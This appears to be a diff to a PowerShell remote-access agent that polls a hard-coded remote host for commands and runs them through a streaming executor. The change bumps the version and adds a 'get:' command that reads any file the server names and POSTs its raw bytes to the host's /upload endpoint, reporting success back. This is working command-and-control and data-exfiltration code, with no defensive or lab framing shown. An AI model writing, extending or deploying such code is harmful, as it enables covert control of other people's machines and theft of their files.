@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.0.2"
+$Version = "3.0.3"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -1044,6 +1044,28 @@ function Connect-Cloudflare {
                 }
                 if ($guiShortcuts.ContainsKey($command.ToLower())) {
                     $command = "gui:" + $guiShortcuts[$command.ToLower()]
+                }
+
+                # File download: get:<filepath> → upload raw bytes to /upload on server
+                if ($command -match '^get:(.+)$') {
+                    $filePath = $Matches[1].Trim()
+                    if (-not (Test-Path $filePath -PathType Leaf)) {
+                        Send-Result-To-Server -Body "[!] File not found: $filePath`n"
+                        Start-Sleep -Milliseconds $activeDelay
+                        continue
+                    }
+                    try {
+                        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+                        $fileName = [System.IO.Path]::GetFileName($filePath)
+                        $uploadUrl = "$cfHost/upload?id=$clientId&filename=$([Uri]::EscapeDataString($fileName))"
+                        $wc = New-Object System.Net.WebClient
+                        $wc.UploadData($uploadUrl, "POST", $fileBytes) | Out-Null
+                        Send-Result-To-Server -Body "[+] Sent '$filePath' ($($fileBytes.Length) bytes)`n"
+                    } catch {
+                        Send-Result-To-Server -Body "[!] Upload failed: $($_.Exception.Message)`n"
+                    }
+                    Start-Sleep -Milliseconds $activeDelay
+                    continue
                 }
 
                 Invoke-CommandStreaming -Command $command
